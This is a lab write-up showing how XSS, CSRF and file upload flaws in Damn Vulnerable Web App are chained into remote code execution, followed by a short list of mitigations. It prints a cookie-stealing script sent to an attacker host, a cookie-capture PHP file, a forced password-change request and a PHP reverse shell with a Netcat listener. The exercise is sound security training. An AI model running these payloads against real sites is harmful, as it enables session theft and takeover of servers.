# Lab Report: DVWA - Chaining XSS, CSRF, and File Upload for RCE

- Lab Type: Web Application Exploitation  
- Skill Level: Beginner–Intermediate  
- Focus: XSS, CSRF, File Upload, RCE  
---
- **Author**: Eric Graham 
- **Date**: 07/28/2025
- **Target**: Damn Vulnerable Web App (DVWA) - `http://[DVWA_IP]`  
- **Security Level**: Low  

---

## Objectives
1. Exploit Stored XSS to steal admin cookies.
2. Use stolen cookies for session hijacking.
3. Chain CSRF to force a password change.
4. Upload a malicious PHP shell via file upload.
5. Achieve Remote Code Execution (RCE).

---

## Tools Used
- **Browser**: Firefox/Chrome + Developer Tools.
- **Burp Suite**: Intercepting/modifying requests.
- **Cookie Editor**: Injecting stolen session cookies.
- **Python HTTP Server**: Hosting malicious files.
- **Netcat**: Reverse shell listener.

---

## Step 1: Stored XSS to Cookie Theft
### Exploitation
1. Navigate to **DVWA → XSS (Stored)**.
2. Inject a malicious script to steal cookies:
   ```html
   <script>document.location='http://[ATTACKER_IP]/steal.php?cookie='+document.cookie</script>
   ```
3. Host a PHP server to capture cookies (`steal.php`):
   ```php
   <?php file_put_contents('cookies.txt', $_GET['cookie']); ?>
   ```
4. **Admin Trigger**: When an admin views the XSS-infected page, their cookies are sent to your server.

### Evidence
![cookie_steal_scrit](/screenshots/dvwa/cookie_steal_script.png)

![php server output](/screenshots/dvwa/server_cookietxt_steal.png)

---

## Step 2: Session Hijacking
### Exploitation
1. Use **Cookie Editor** to inject the stolen `PHPSESSID` and `security=low` cookies.
2. Refresh the page to gain admin access.

### Evidence
![cookie_editor](/screenshots/dvwa/cookie_hijack.png)

![dvwa hijacked login](/screenshots/dvwa/hijack_login.png)

---

## Step 3: CSRF to Force Password Change
### Exploitation
1. Craft a malicious HTML file (`csrf.html`):
   ```html
   <img src="http://[DVWA_IP]/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
   ```
2. Host it on a Python server:
   ```bash
   python3 -m http.server 8000
   ```
3. Trick the admin into visiting `http://[ATTACKER_IP]:8000/csrf.html`.

### Evidence
![csrf email payload](/screenshots/dvwa/email_payload.png)

![python3](/screenshots/dvwa/server_rcvd_csrf.png)

![sql database](/screenshots/dvwa/database_pw_proof.png)

![Hashes.com](/screenshots/dvwa/pw_chng_proof.png)

---

## Step 4: File Upload to RCE
### Exploitation
1. Log in as admin (via hijacked session).
2. Navigate to **DVWA → File Upload**.
3. Upload a PHP reverse shell (`shell.php`):
   ```php
   <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1'"); ?>
   ```
4. Start a Netcat listener:
   ```bash
   nc -lvnp 4444
   ```
5. Access the uploaded shell at `http://[DVWA_IP]/hackable/uploads/shell.php`.

### Evidence
![netcat](/screenshots/dvwa/rev_shell_output.png)

---

## Mitigations
1. **XSS**: 
   - Sanitize user input with `htmlspecialchars()`.
   - Implement Content Security Policy (CSP).
2. **CSRF**: 
   - Use anti-CSRF tokens.
   - Require POST requests for sensitive actions.
3. **File Upload**: 
   - Restrict file extensions (e.g., block `.php`).
   - Store uploads outside the web root.

---

## Conclusion
This lab demonstrated how chaining low-severity vulnerabilities (XSS → CSRF → File Upload) can lead to **full system compromise**. Always validate inputs, enforce strict session controls, and audit file uploads.

---

**Appendix**:  
- [Full PHP reverse shell code]  
- [Burp Suite request/response samples]

---

~ Eric Graham
